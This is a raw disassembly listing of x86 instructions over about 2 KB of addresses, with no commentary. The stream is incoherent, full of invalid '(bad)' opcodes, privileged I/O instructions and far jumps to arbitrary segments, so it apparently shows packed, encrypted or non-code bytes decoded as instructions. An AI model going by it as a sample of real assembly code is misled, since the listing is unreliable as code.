  41d5f1:	cmp    esp,DWORD PTR [esi+0x7839b11b]
  41d5f7:	xor    BYTE PTR [ebx+0x36],bh
  41d5fa:	inc    esi
  41d5fb:	scas   al,BYTE PTR es:[edi]
  41d5fc:	aad    0x81
  41d5fe:	mov    dh,0x5c
  41d600:	leave  
  41d601:	fst    st(5)
  41d603:	mov    ah,0xe2
  41d605:	push   0x442e2037
  41d60a:	fcomip st,st(0)
  41d60c:	mov    ecx,DWORD PTR [esp+esi*2+0xc]
  41d610:	dec    esi
  41d611:	scas   eax,DWORD PTR es:[edi]
  41d612:	adc    eax,edx
  41d614:	pusha  
  41d615:	or     al,0x9c
  41d617:	dec    ebx
  41d618:	add    DWORD PTR [esi+esi*8],ebx
  41d61b:	xor    DWORD PTR [eax-0x1cadc9af],ebx
  41d621:	cli    
  41d622:	loope  0x41d680
  41d624:	stc    
  41d625:	jb     0x41d632
  41d627:	sbb    bl,BYTE PTR [eax]
  41d629:	mov    eax,DWORD PTR [ecx-0x76522cc2]
  41d62f:	sub    al,0x39
  41d631:	imul   ebp,DWORD PTR [ebp+0x29],0x5a
  41d635:	jmp    0xd011:0xf38ca46
  41d63c:	lods   eax,DWORD PTR ds:[esi]
  41d63d:	sahf   
  41d63e:	pop    esi
  41d63f:	in     al,dx
  41d640:	jp     0x41d5e3
  41d642:	add    cl,BYTE PTR [ecx-0x7f]
  41d645:	std    
  41d646:	(bad)  
  41d647:	mov    eax,ds:0xb186fe0f
  41d64c:	mov    esp,0x5216a321
  41d651:	adc    ebx,DWORD PTR [esp+eiz*8-0x7c]
  41d655:	lock xor DWORD PTR es:[esi-0x36aacc44],esp
  41d65d:	icebp  
  41d65e:	stc    
  41d65f:	mov    edi,0x2a944fc0
  41d664:	scas   al,BYTE PTR es:[edi]
  41d665:	push   esp
  41d666:	inc    esp
  41d667:	add    ebx,DWORD PTR [esp+edi*2+0x28da6761]
  41d66e:	jp     0x41d680
  41d670:	daa    
  41d671:	xor    ch,bh
  41d673:	push   0xf8f08e4
  41d678:	jbe    0x41d6bf
  41d67a:	adc    ecx,DWORD PTR [esi]
  41d67c:	hlt    
  41d67d:	add    ecx,DWORD PTR [edx]
  41d67f:	push   esi
  41d680:	add    al,0x0
  41d682:	pop    edx
  41d683:	cdq    
  41d684:	fst    QWORD PTR [eax-0x42051a54]
  41d68a:	sub    dl,BYTE PTR [edx+0x4fa1f3f3]
  41d690:	or     DWORD PTR [edx],esp
  41d692:	sbb    al,0x9e
  41d694:	pop    edx
  41d695:	int3   
  41d696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d697:	pop    ss
  41d698:	or     ecx,DWORD PTR [edi]
  41d69a:	or     bh,BYTE PTR es:[ebx-0x368aab90]
  41d6a1:	gs xchg ecx,eax
  41d6a3:	pop    edx
  41d6a4:	call   0xcf39:0xac2606dc
  41d6ab:	add    dh,al
  41d6ad:	cmp    BYTE PTR [esi],0x75
  41d6b0:	in     eax,dx
  41d6b1:	das    
  41d6b2:	cdq    
  41d6b3:	and    bl,al
  41d6b5:	adc    eax,0xf8277e4e
  41d6ba:	or     cl,cl
  41d6bc:	or     ch,al
  41d6be:	mov    ds:0x7011710b,eax
  41d6c3:	jecxz  0x41d69f
  41d6c5:	xchg   edx,eax
  41d6c6:	mov    al,ds:0x1d7fd7fd
  41d6cb:	sub    BYTE PTR ds:0x6dfb1fc6,cl
  41d6d1:	xor    ebx,0xcfebeb0
  41d6d7:	retf   
  41d6d8:	sub    al,0x6b
  41d6da:	cmp    ebx,eax
  41d6dc:	mov    cl,0xaa
  41d6de:	aam    0x7
  41d6e0:	ret    0x9323
  41d6e3:	or     cl,BYTE PTR [ebp+eax*1-0x41]
  41d6e7:	addr16 sahf 
  41d6e9:	dec    ecx
  41d6ea:	imul   DWORD PTR [edi]
  41d6ec:	push   ebp
  41d6ed:	mov    ch,0x83
  41d6ef:	rcl    dl,cl
  41d6f1:	fadd   QWORD PTR [ebp+0x3d0c2ac5]
  41d6f7:	sub    BYTE PTR [esi+edx*1-0x44],dh
  41d6fb:	mov    esp,0xe6a13a88
  41d700:	xor    eax,0xa191751b
  41d705:	jmp    0xca4e:0x6d645e91
  41d70c:	sub    eax,0xe831bf40
  41d711:	add    BYTE PTR [edi-0x37],ah
  41d714:	or     BYTE PTR [ebx-0x7b7cadf3],ah
  41d71a:	(bad)
  41d71d:	jbe    0x41d6ea
  41d71f:	push   DWORD PTR [esi+0xb]
  41d722:	ss xchg edi,eax
  41d724:	adc    BYTE PTR [ebp+edx*4+0x55],cl
  41d728:	mov    ecx,0x69d8cb1f
  41d72d:	sar    BYTE PTR [ecx],cl
  41d72f:	test   eax,0x84c7d4c4
  41d734:	scas   eax,DWORD PTR es:[edi]
  41d735:	les    edi,FWORD PTR [ebx]
  41d737:	das    
  41d738:	jg     0x41d6ec
  41d73a:	adc    esp,ebx
  41d73c:	adc    eax,0x4174910a
  41d741:	fmul   DWORD PTR [ebp-0x5b7c3b43]
  41d747:	cdq    
  41d748:	mov    ch,0xd7
  41d74a:	inc    eax
  41d74b:	add    ah,BYTE PTR [ecx+0x74]
  41d74e:	or     al,0xdb
  41d750:	jle    0x41d70a
  41d752:	leave  
  41d753:	cmp    eax,0x6388a8ce
  41d758:	push   0xf
  41d75a:	mov    eax,ds:0xf6e430cc
  41d75f:	push   cs
  41d760:	dec    edi
  41d761:	push   0xffffffbc
  41d763:	mov    WORD PTR [esi],ss
  41d765:	and    al,0x7
  41d767:	shl    dh,1
  41d769:	(bad)  
  41d76b:	stc    
  41d76c:	nop
  41d76d:	ret    0x6c85
  41d770:	cld    
  41d771:	sub    esp,DWORD PTR [edi]
  41d773:	sar    DWORD PTR es:[edi],cl
  41d776:	adc    DWORD PTR [edx-0x29b81093],ebx
  41d77c:	popf   
  41d77d:	jo     0x41d7d4
  41d77f:	aam    0x3e
  41d781:	pop    edi
  41d782:	enter  0xdca2,0x39
  41d786:	push   0x6e754835
  41d78b:	add    eax,esi
  41d78d:	fistp  WORD PTR [esi-0x375afefc]
  41d793:	mov    esi,0xf61bafd2
  41d798:	mov    ebx,0x5611ed0e
  41d79d:	les    ebp,FWORD PTR [ebx+0x26]
  41d7a0:	push   edi
  41d7a1:	xor    eax,0xfc088992
  41d7a6:	cs jo  0x41d816
  41d7a9:	cmp    esp,DWORD PTR [edi+0xd478da9]
  41d7af:	mov    eax,0x5194c923
  41d7b4:	retf   
  41d7b5:	shl    edx,cl
  41d7b7:	push   0xffffff9f
  41d7b9:	and    bh,dh
  41d7bb:	ret    
  41d7bc:	dec    edi
  41d7bd:	dec    ebx
  41d7be:	das    
  41d7bf:	push   es
  41d7c0:	rcr    ah,cl
  41d7c2:	inc    edi
  41d7c3:	cld    
  41d7c4:	inc    ecx
  41d7c5:	cmc    
  41d7c6:	push   edx
  41d7c7:	sbb    dh,BYTE PTR [edx]
  41d7c9:	pushf  
  41d7ca:	pushf  
  41d7cb:	or     eax,0x3bf38df5
  41d7d0:	jle    0x41d824
  41d7d2:	jge    0x41d7c3
  41d7d4:	outs   dx,DWORD PTR ds:[esi]
  41d7d5:	mov    bl,0xf7
  41d7d7:	jmp    0x41d81a
  41d7d9:	mov    bh,0x8b
  41d7db:	jl     0x41d84a
  41d7dd:	adc    DWORD PTR [edi-0x51],esp
  41d7e0:	(bad)  
  41d7e1:	jecxz  0x41d7b0
  41d7e3:	or     al,0x42
  41d7e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7e6:	jecxz  0x41d7e3
  41d7e8:	test   al,0xa7
  41d7ea:	std    
  41d7eb:	cwde   
  41d7ec:	retf   
  41d7ed:	ss lahf 
  41d7ef:	xor    eax,0xf5a09bab
  41d7f4:	retf   
  41d7f5:	jp     0x41d7da
  41d7f7:	xchg   edi,eax
  41d7f8:	(bad)  
  41d7f9:	lock icebp 
  41d7fb:	mov    ecx,0xe121d516
  41d800:	adc    ah,dl
  41d802:	popf   
  41d803:	mov    eax,ds:0x644d9ad3
  41d808:	aas    
  41d809:	dec    ecx
  41d80a:	setl   BYTE PTR [edi]
  41d80d:	jmp    0xf6e83456
  41d812:	or     DWORD PTR [esi+edi*2+0x42096961],esp
  41d819:	xchg   edx,eax
  41d81a:	push   edi
  41d81b:	push   es
  41d81c:	sbb    ah,BYTE PTR [esi]
  41d81e:	imul   BYTE PTR [edx]
  41d820:	loope  0x41d7ef
  41d822:	mov    eax,ds:0x4bef7535
  41d827:	(bad)  
  41d829:	push   ds
  41d82a:	test   al,0x88
  41d82c:	sbb    dh,bl
  41d82e:	mov    DWORD PTR [ebx],esi
  41d830:	mov    ebp,0xa6ab1a0b
  41d835:	cdq    
  41d836:	dec    eax
  41d837:	mov    ch,0x17
  41d839:	xchg   BYTE PTR [ecx],ch
  41d83b:	sbb    al,0xc
  41d83d:	fadd   DWORD PTR [esi]
  41d83f:	push   ebx
  41d840:	ret    0x3d8c
  41d843:	jbe    0x41d8bd
  41d845:	retf   0xf1f3
  41d848:	imul   ebp,DWORD PTR [di],0x51
  41d84c:	xor    BYTE PTR [edi],al
  41d84e:	gs leave 
  41d850:	and    DWORD PTR [ebx-0xd],ecx
  41d853:	mov    al,ds:0xd283cbb8
  41d858:	test   al,0x55
  41d85a:	leave  
  41d85b:	jp     0x41d88c
  41d85d:	add    esi,DWORD PTR [esi-0x96242d4]
  41d863:	xchg   DWORD PTR [edx-0x5ef9825a],eax
  41d869:	sahf   
  41d86a:	and    bl,BYTE PTR [esi-0x7fd8e3af]
  41d870:	jae    0x41d8d2
  41d872:	adc    DWORD PTR [ebx-0x68009647],esp
  41d878:	fadd   st(6),st
  41d87a:	mov    ds:0x641c8d8,al
  41d87f:	sahf   
  41d880:	and    BYTE PTR [esi],al
  41d882:	or     cl,dh
  41d884:	cmc    
  41d885:	lahf   
  41d886:	xchg   ebx,eax
  41d887:	repz and edi,ebx
  41d88a:	in     al,0xaa
  41d88c:	jno    0x41d8ca
  41d88e:	nop
  41d88f:	mov    dh,0x5e
  41d891:	sahf   
  41d892:	sahf   
  41d893:	fst    QWORD PTR [esi-0x63647c2f]
  41d899:	pop    esp
  41d89a:	push   esi
  41d89b:	or     al,0xa3
  41d89d:	push   ecx
  41d89e:	lods   al,BYTE PTR ds:[esi]
  41d89f:	xchg   ebx,eax
  41d8a0:	push   ds
  41d8a1:	mov    ah,0xbb
  41d8a3:	cs push edx
  41d8a5:	inc    ecx
  41d8a6:	jnp    0x41d876
  41d8a8:	imul   ebp,ebx,0xffffff93
  41d8ab:	(bad)  
  41d8ac:	dec    esi
  41d8ad:	or     dl,BYTE PTR [esi]
  41d8af:	xor    al,0x38
  41d8b1:	add    al,0xd6
  41d8b3:	or     ebx,DWORD PTR ds:0xb22cdb69
  41d8b9:	je     0x41d85a
  41d8bb:	push   ebx
  41d8bc:	(bad)  
  41d8bd:	mov    ebp,0x5b773ff4
  41d8c2:	cwde   
  41d8c3:	add    BYTE PTR [eax-0x62703a2d],al
  41d8c9:	and    ebx,DWORD PTR [esp+eax*8-0xd]
  41d8cd:	xchg   edi,eax
  41d8ce:	into   
  41d8cf:	push   ebx
  41d8d0:	js     0x41d891
  41d8d2:	xchg   ebx,eax
  41d8d3:	ret    0xba46
  41d8d6:	stc    
  41d8d7:	test   al,0xa5
  41d8d9:	rcr    ecx,cl
  41d8db:	cmp    cl,BYTE PTR [ecx-0x330d5cfa]
  41d8e1:	fnclex 
  41d8e3:	add    edi,DWORD PTR fs:[edi-0x6a5df5b4]
  41d8ea:	xlat   BYTE PTR ds:[ebx]
  41d8eb:	dec    ecx
  41d8ec:	in     al,dx
  41d8ed:	in     al,0xb7
  41d8ef:	adc    esp,DWORD PTR [edx+ebx*1]
  41d8f2:	sbb    bl,bl
  41d8f4:	call   0x63f1c03a
  41d8f9:	enter  0xd95f,0x4f
  41d8fd:	scas   eax,DWORD PTR es:[edi]
  41d8fe:	mov    bl,0xc7
  41d900:	(bad)  
  41d901:	(bad)  
  41d903:	push   ebx
  41d904:	mov    cl,0x84
  41d906:	jb     0x41d8b8
  41d908:	inc    edx
  41d909:	stc    
  41d90a:	neg    BYTE PTR [edi-0x50148899]
  41d910:	mov    bh,0x83
  41d912:	xchg   esp,eax
  41d913:	mov    dl,0x91
  41d915:	or     BYTE PTR [esi+0x10],bl
  41d918:	jbe    0x41d92d
  41d91a:	push   edx
  41d91b:	addr16 add eax,0x79d19383
  41d921:	mov    ds:0xa9622402,al
  41d926:	ret    0x577c
  41d929:	repz int 0xb3
  41d92c:	xor    edi,DWORD PTR [edx-0x3bc34def]
  41d932:	adc    BYTE PTR [ebx+0x15],cl
  41d935:	sub    BYTE PTR [esi-0x57],dl
  41d938:	cmp    BYTE PTR [edi],dh
  41d93a:	repz sti 
  41d93c:	xlat   BYTE PTR ds:[ebx]
  41d93d:	clc    
  41d93e:	fs sbb eax,0xd3c0bc95
  41d944:	inc    esi
  41d945:	push   es
  41d946:	or     BYTE PTR [ecx],bh
  41d948:	lock add bl,BYTE PTR [ecx-0x266d36d3]
  41d94f:	mov    ch,0xe9
  41d951:	leave  
  41d952:	jne    0x41d9a2
  41d954:	call   0x7bd4f405
  41d959:	inc    esp
  41d95a:	sar    edx,cl
  41d95c:	popf   
  41d95d:	xor    esi,ecx
  41d95f:	jbe    0x41d97c
  41d961:	cmp    eax,0xbaed2509
  41d966:	push   es
  41d967:	or     BYTE PTR [esi+eiz*2],al
  41d96a:	pop    ebx
  41d96b:	neg    DWORD PTR [esi+0x78]
  41d96e:	or     cl,BYTE PTR [esi-0x20]
  41d971:	loope  0x41d968
  41d973:	cdq    
  41d974:	pop    esp
  41d975:	test   eax,0x86b0da3e
  41d97a:	das    
  41d97b:	cmp    al,0x10
  41d97d:	sbb    DWORD PTR [ebp-0x73],edi
  41d980:	mov    ds:0xbda6f45a,eax
  41d985:	mov    esp,0xff114670
  41d98a:	xchg   ecx,eax
  41d98b:	inc    esi
  41d98c:	leave  
  41d98d:	dec    eax
  41d98e:	aad    0x19
  41d990:	(bad)  
  41d991:	(bad)  [edx]
  41d993:	ds inc esp
  41d995:	nop
  41d996:	push   esi
  41d997:	mov    al,ds:0xd1c59dfc
  41d99c:	or     DWORD PTR [eax],0x6b
  41d99f:	sar    DWORD PTR [ecx],1
  41d9a1:	clc    
  41d9a2:	sub    eax,0xf9062609
  41d9a7:	mov    ah,0x46
  41d9a9:	into   
  41d9aa:	scas   al,BYTE PTR es:[edi]
  41d9ab:	dec    ebp
  41d9ac:	mov    al,0xa8
  41d9ae:	fsubp  st(5),st
  41d9b0:	inc    ebp
  41d9b1:	jmp    0x41d9f8
  41d9b3:	arpl   WORD PTR [ebx],bp
  41d9b5:	repz (bad) 
  41d9b7:	and    ch,ch
  41d9b9:	fadd   QWORD PTR [eax]
  41d9bb:	mov    bl,0xfa
  41d9bd:	(bad)  
  41d9bf:	(bad)  
  41d9c0:	popf   
  41d9c1:	scas   eax,DWORD PTR es:[edi]
  41d9c2:	(bad)  
  41d9c3:	aaa    
  41d9c4:	jnp    0x41d9d7
  41d9c6:	sbb    BYTE PTR [edx-0x4f],dl
  41d9c9:	fisub  DWORD PTR [edx+eax*4-0x5c]
  41d9cd:	xor    DWORD PTR ds:0x84a88cf6,0x23
  41d9d4:	push   esp
  41d9d5:	iret   
  41d9d6:	in     al,dx
  41d9d7:	mov    bl,0x9d
  41d9d9:	(bad)  
  41d9da:	push   esi
  41d9db:	push   ds
  41d9dc:	dec    ebx
  41d9dd:	xchg   ebp,eax
  41d9de:	add    al,0x7e
  41d9e0:	daa    
  41d9e1:	out    dx,eax
  41d9e2:	mov    BYTE PTR [esi],bl
  41d9e4:	imul   edx,ebp,0x28
  41d9e7:	and    ebp,DWORD PTR [ecx+0x7b]
  41d9ea:	test   eax,0x51dfa45d
  41d9ef:	inc    edi
  41d9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9f1:	or     al,0x6e
  41d9f3:	out    dx,al
  41d9f4:	stos   DWORD PTR es:[edi],eax
  41d9f5:	in     eax,dx
  41d9f6:	pop    es
  41d9f7:	jne    0x41da74
  41d9f9:	mov    ebp,0x49a6f71c
  41d9fe:	dec    edi
  41d9ff:	add    bl,dl
  41da01:	jo     0x41da4f
  41da03:	enter  0xd25c,0x1e
  41da07:	or     eax,0xb13ee405
  41da0c:	push   ds
  41da0d:	or     ebp,DWORD PTR [edi]
  41da0f:	dec    ecx
  41da10:	neg    WORD PTR gs:[edx]
  41da14:	xchg   ebx,eax
  41da15:	dec    edx
  41da16:	cmp    ah,BYTE PTR [ecx+0x1]
  41da19:	mov    ebx,0x8d8b7022
  41da1e:	pop    ecx
  41da1f:	push   eax
  41da20:	push   ss
  41da21:	fucom  st(1)
  41da23:	mov    ecx,0x83073621
  41da28:	lods   al,BYTE PTR ds:[esi]
  41da29:	adc    eax,0x555e7516
  41da2e:	daa    
  41da2f:	mov    ds:0x9e378264,al
  41da34:	adc    cl,dl
  41da36:	cmp    eax,0x3964a204
  41da3b:	jmp    0x41da90
  41da3d:	cmp    ecx,DWORD PTR [edx]
  41da3f:	inc    ecx
  41da40:	dec    esi
  41da41:	cmp    bh,BYTE PTR [esp+edi*2]
  41da44:	mov    edx,0x44e9c38a
  41da49:	push   0xffffffbf
  41da4b:	sub    al,0xbe
  41da4d:	jmp    0x41da68
  41da4f:	pusha  
  41da50:	dec    ebp
  41da51:	cmc    
  41da52:	xor    DWORD PTR [ebp-0x1f71c1d4],0xffffff9b
  41da59:	cs dec edx
  41da5b:	cmp    ah,BYTE PTR [edi+0x11]
  41da5e:	test   BYTE PTR [ecx-0x271142e1],dh
  41da64:	pusha  
  41da65:	icebp  
  41da66:	xor    edx,DWORD PTR [ebx+0x72f943fb]
  41da6c:	icebp  
  41da6d:	push   edi
  41da6e:	pop    edx
  41da6f:	mov    eax,ds:0x93379146
  41da74:	xor    eax,0xe850c312
  41da79:	les    ecx,FWORD PTR [ebp+0x4f]
  41da7c:	mov    bh,0x95
  41da7e:	xor    bh,BYTE PTR [eax]
  41da80:	add    ebp,ebx
  41da82:	mov    edi,0xa3a5cb02
  41da87:	inc    eax
  41da88:	mov    ss,WORD PTR [edi]
  41da8a:	inc    esi
  41da8b:	out    dx,al
  41da8c:	mov    BYTE PTR [esi-0x3c],ch
  41da8f:	inc    ebp
  41da90:	ret    
  41da91:	jmp    0xced3d8b7
  41da96:	cmp    ch,BYTE PTR [ecx+eax*4]
  41da99:	cmc    
  41da9a:	fwait
  41da9b:	into   
  41da9c:	mov    eax,ds:0xf7db127f
  41daa1:	mov    ch,0x62
  41daa3:	inc    eax
  41daa4:	inc    esi
  41daa5:	xlat   BYTE PTR ds:[ebx]
  41daa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daa7:	in     al,dx
  41daa8:	add    BYTE PTR [esi],dl
  41daaa:	stos   BYTE PTR es:[edi],al
  41daab:	add    DWORD PTR [edi-0xe5c74da],0xffffffec
  41dab2:	push   edi
  41dab3:	popa   
  41dab4:	xchg   esp,eax
  41dab5:	pushf  
  41dab6:	test   al,0x18
  41dab8:	aam    0x6d
  41daba:	popa   
  41dabb:	cmp    al,0xa9
  41dabd:	das    
  41dabe:	aaa    
  41dabf:	xor    al,0xe8
  41dac1:	cwde   
  41dac2:	repnz cmp DWORD PTR [esi],eax
  41dac5:	push   ss
  41dac6:	mov    al,ds:0x99c8dfb6
  41dacb:	xor    esi,0x75
  41dace:	dec    ebp
  41dacf:	aaa    
  41dad0:	sbb    DWORD PTR [esi-0x5d5bb33a],0xa11950a8
  41dada:	sbb    al,0x7f
  41dadc:	jmp    DWORD PTR [esi+0x7f]
  41dadf:	repnz in eax,dx
  41dae1:	jmp    0x41dac6
  41dae3:	add    bh,BYTE PTR [edi+esi*1+0x6e985b48]
  41daea:	or     cl,BYTE PTR [ebp+0x1ab44daf]
  41daf0:	mov    DWORD PTR [eax-0x46659e6],esi
  41daf6:	add    eax,0xe1fe377b
  41dafb:	out    dx,eax
  41dafc:	inc    eax
  41dafd:	ins    DWORD PTR es:[edi],dx
  41dafe:	aam    0xef
  41db00:	xchg   edi,eax
  41db01:	pop    ecx
  41db02:	push   esi
  41db03:	lds    eax,FWORD PTR [edi+0x4f]
  41db06:	cmc    
  41db07:	das    
  41db08:	mov    fs,WORD PTR [eax-0x66]
  41db0b:	pusha  
  41db0c:	pop    esp
  41db0d:	pop    ds
  41db0e:	jp     0x41daee
  41db10:	rcl    DWORD PTR [edi+0x75406521],0x5a
  41db17:	or     eax,0x8625c86e
  41db1c:	mov    eax,0xef72abcd
  41db21:	(bad)  
  41db22:	ror    BYTE PTR [edx-0x25],1
  41db25:	mov    cl,0x57
  41db27:	nop
  41db28:	mov    ecx,0xf4428165
  41db2d:	jo     0x41db14
  41db2f:	xchg   esp,eax
  41db30:	add    BYTE PTR [ecx+0x1168562a],0xc7
  41db37:	scas   eax,DWORD PTR es:[edi]
  41db38:	jl     0x41db90
  41db3a:	add    al,0x4b
  41db3c:	mov    ch,0x30
  41db3e:	mov    edx,0x669d90cd
  41db43:	aaa    
  41db44:	(bad)  
  41db46:	stos   DWORD PTR es:[edi],eax
  41db47:	cmp    al,0xc3
  41db49:	and    al,0x84
  41db4b:	fxch   st(3)
  41db4d:	jb     0x41db43
  41db4f:	or     eax,0x12f4806c
  41db54:	(bad)  
  41db55:	cdq    
  41db56:	mov    ecx,0x62f98ce6
  41db5b:	mov    eax,ds:0xc3830d71
  41db60:	cmp    bl,BYTE PTR [eax-0x3035a397]
  41db66:	test   eax,0xdea72ec2
  41db6b:	je     0x41db57
  41db6d:	shl    BYTE PTR gs:[esi-0x56310723],cl
  41db74:	mov    dl,0x47
  41db76:	fstp   DWORD PTR [eax+eax*2-0x16d0bed0]
  41db7d:	and    al,0xeb
  41db7f:	loop   0x41db83
  41db81:	into   
  41db82:	mov    ds:0xcac4e9e9,eax
  41db87:	dec    ebp
  41db88:	into   
  41db89:	mov    ah,0x65
  41db8b:	out    dx,eax
  41db8c:	(bad)
  41db8f:	mov    edx,0xc1a5a71e
  41db94:	sbb    al,0xac
  41db96:	cmp    BYTE PTR [edx],al
  41db98:	xchg   esp,eax
  41db99:	cs add ch,ch
  41db9c:	mov    ds:0xec761a34,eax
  41dba1:	jo     0x41db62
  41dba3:	inc    esp
  41dba4:	(bad)  
  41dba5:	sub    esp,DWORD PTR [esi+ebp*4+0x2c]
  41dba9:	hlt    
  41dbaa:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41dbac:	clc    
  41dbad:	mov    esp,esp
  41dbaf:	mov    al,ds:0x3ae4ab2f
  41dbb4:	push   ss
  41dbb5:	mov    al,0x31
  41dbb7:	add    al,0x5b
  41dbb9:	lea    esp,[ebx]
  41dbbb:	sub    eax,0x4f2b7cad
  41dbc0:	sbb    al,0xf2
  41dbc2:	sbb    edx,DWORD PTR [edx+0x1d]
  41dbc5:	(bad)  
  41dbc6:	xchg   ebp,eax
  41dbc7:	mov    ah,ah
  41dbc9:	outs   dx,BYTE PTR ds:[esi]
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	mov    eax,0xd9463042
  41dbd0:	in     al,0x6f
  41dbd2:	push   0x57974bc5
  41dbd7:	outs   dx,BYTE PTR ds:[esi]
  41dbd8:	adc    al,0x4e
  41dbda:	(bad)  
  41dbdb:	(bad)  
  41dbdc:	or     dh,BYTE PTR [edi]
  41dbde:	repz shr BYTE PTR [esi-0x659da952],0xdd
  41dbe6:	cli    
  41dbe7:	mov    dh,0xd8
  41dbe9:	xchg   esp,eax
  41dbea:	or     eax,0x2d412104
  41dbef:	inc    edx
  41dbf0:	lods   al,BYTE PTR ds:[esi]
  41dbf1:	pop    esp
  41dbf2:	arpl   bp,sp
  41dbf4:	mov    ebx,0xdb1540be
  41dbf9:	mov    al,ds:0xa228901
  41dbfe:	(bad)  
  41dbff:	mov    esp,0xc7b49bf1
  41dc04:	cwde   
  41dc05:	sub    BYTE PTR [edx-0x65],al
  41dc08:	into   
  41dc09:	cli    
  41dc0a:	mov    eax,0x5f0ed6f1
  41dc0f:	adc    al,0x52
  41dc11:	(bad)  
  41dc13:	dec    edx
  41dc14:	int3   
  41dc15:	rcl    DWORD PTR [edx],cl
  41dc17:	xchg   edx,eax
  41dc18:	mov    WORD PTR [ebx-0x30b58359],fs
  41dc1e:	jns    0x41dc74
  41dc20:	mov    ds:0x35c50305,eax
  41dc25:	mov    bh,BYTE PTR [eax+0x67]
  41dc28:	in     eax,dx
  41dc29:	sar    BYTE PTR cs:[ecx],0x80
  41dc2d:	and    esp,DWORD PTR gs:[eax-0x3d]
  41dc31:	into   
  41dc32:	hlt    
  41dc33:	jno    0x41dbc2
  41dc35:	sub    eax,DWORD PTR [edx+0x1b]
  41dc38:	mov    bl,0x2d
  41dc3a:	test   edx,ecx
  41dc3c:	jmp    0x9540:0x91282d95
  41dc43:	jb     0x41dc4a
  41dc45:	adc    dh,BYTE PTR [ecx+0x4f]
  41dc48:	mov    al,ds:0x6617ca0
  41dc4d:	and    ebp,DWORD PTR ds:0x85e4954f
  41dc53:	lods   eax,DWORD PTR ds:[esi]
  41dc54:	pop    es
  41dc55:	mov    cl,0x10
  41dc57:	adc    al,BYTE PTR [edx+0x3dbf14a]
  41dc5d:	cmp    esp,esp
  41dc5f:	push   ebp
  41dc60:	mov    eax,ds:0x77cc5f5c
  41dc65:	push   ds
  41dc66:	mov    eax,0xcc70bc45
  41dc6b:	pop    ebp
  41dc6c:	inc    edi
  41dc6d:	or     ebp,DWORD PTR [ecx-0xcdcb831]
  41dc73:	sub    esi,DWORD PTR [esp+esi*1+0x647a954b]
  41dc7a:	fnsave [edx+0x64deef0]
  41dc80:	scas   eax,DWORD PTR es:[edi]
  41dc81:	push   eax
  41dc82:	cmp    ecx,eax
  41dc84:	ret    
  41dc85:	cmp    al,0xff
  41dc87:	dec    esp
  41dc88:	lds    edx,FWORD PTR [ebp+0x78]
  41dc8b:	push   edx
  41dc8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc8d:	push   es
  41dc8e:	adc    edx,DWORD PTR [ebx]
  41dc90:	(bad)
  41dc94:	gs xor edx,ebx
  41dc97:	ds xchg edx,eax
  41dc99:	lock das 
  41dc9b:	ds jmp 0x41dc4e
  41dc9e:	pop    ss
  41dc9f:	add    al,0xe5
  41dca1:	pop    ecx
  41dca2:	jmp    FWORD PTR [ebp+0x24eafe40]
  41dca8:	adc    DWORD PTR [ecx],0xfffffffd
  41dcab:	out    0xca,al
  41dcad:	test   BYTE PTR [edi-0x710415cd],al
  41dcb3:	lahf   
  41dcb4:	retf   
  41dcb5:	fnstenv [eax]
  41dcb7:	fsub   QWORD PTR [esi+ebx*8]
  41dcba:	(bad)  
  41dcbb:	or     ch,BYTE PTR [edx]
  41dcbd:	fs mov ebp,0x8c2b4aae
  41dcc3:	pop    es
  41dcc4:	pop    edx
  41dcc5:	mov    edx,0x8bd4718c
  41dcca:	mov    BYTE PTR [edx],bh
  41dccc:	nop
  41dccd:	push   cs
  41dcce:	dec    edi
  41dccf:	cmc    
  41dcd0:	mov    eax,ds:0x92e5de9d
  41dcd5:	inc    ebp
  41dcd6:	xor    bl,ch
  41dcd8:	push   edx
  41dcd9:	xor    BYTE PTR [eax],dh
  41dcdb:	mov    WORD PTR [esi+0x28],gs
  41dcde:	and    BYTE PTR [ebx+edx*8+0x619de2cb],cl
  41dce5:	out    0xbe,al
  41dce7:	aam    0x55
  41dce9:	test   DWORD PTR [ecx],edx
  41dceb:	jecxz  0x41dc86
  41dced:	mov    dl,0x7c
  41dcef:	push   edx
  41dcf0:	or     BYTE PTR [ecx+0x2e],0x8f
  41dcf4:	and    al,0x1b
  41dcf6:	outs   dx,DWORD PTR ds:[esi]
  41dcf7:	repz (bad) 
  41dcfc:	(bad)  
  41dcfd:	jnp    0x41dd3d
  41dcff:	mov    dl,0xb6
  41dd01:	adc    dl,0x5d
  41dd04:	pop    edi
  41dd05:	test   BYTE PTR [bp+di+0x1880],0x1
  41dd0b:	mov    dl,0x2b
  41dd0d:	enter  0xbe07,0xaa
  41dd11:	lea    edi,[edx]
  41dd13:	adc    DWORD PTR [ecx-0x76],edi
  41dd16:	mov    esi,0x52ca0d20
  41dd1b:	push   ebx
  41dd1c:	sbb    eax,0x15ccb91f
  41dd21:	mov    ecx,0x117cf514
  41dd26:	and    al,0x9f
  41dd28:	mov    al,ds:0x5d40d8ca
  41dd2d:	mov    al,0xce
  41dd2f:	push   edx
  41dd30:	je     0x41dd56
  41dd32:	inc    edi
  41dd33:	call   0xd698:0x70685d1d
  41dd3a:	test   DWORD PTR [ebx+0x6a8219],ebx
  41dd40:	jge    0x41dcec
  41dd42:	sbb    esp,DWORD PTR ds:0xe0343390
  41dd48:	cmp    DWORD PTR [ecx+0x16],eax
  41dd4b:	cmp    al,0xb3
  41dd4d:	dec    eax
  41dd4e:	imul   esi,DWORD PTR [bx-0x60ac],0xcf4e461c
  41dd57:	push   esp
  41dd58:	pop    esi
  41dd59:	stc    
  41dd5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd5b:	popf   
  41dd5c:	outs   dx,DWORD PTR ds:[esi]
  41dd5d:	loop   0x41dd4d
  41dd5f:	cmc    
  41dd60:	(bad)  
  41dd61:	mov    bh,0x56
  41dd63:	test   BYTE PTR [edi-0x6aae544f],bl
  41dd69:	addr16 sub esi,0x1c0aa000
  41dd70:	into   
  41dd71:	or     ebx,DWORD PTR [esi-0x6b]
  41dd74:	or     esi,ebx
  41dd76:	jb     0x41dde4
  41dd78:	stos   DWORD PTR es:[edi],eax
  41dd79:	(bad)  
  41dd7a:	xchg   esp,ebx
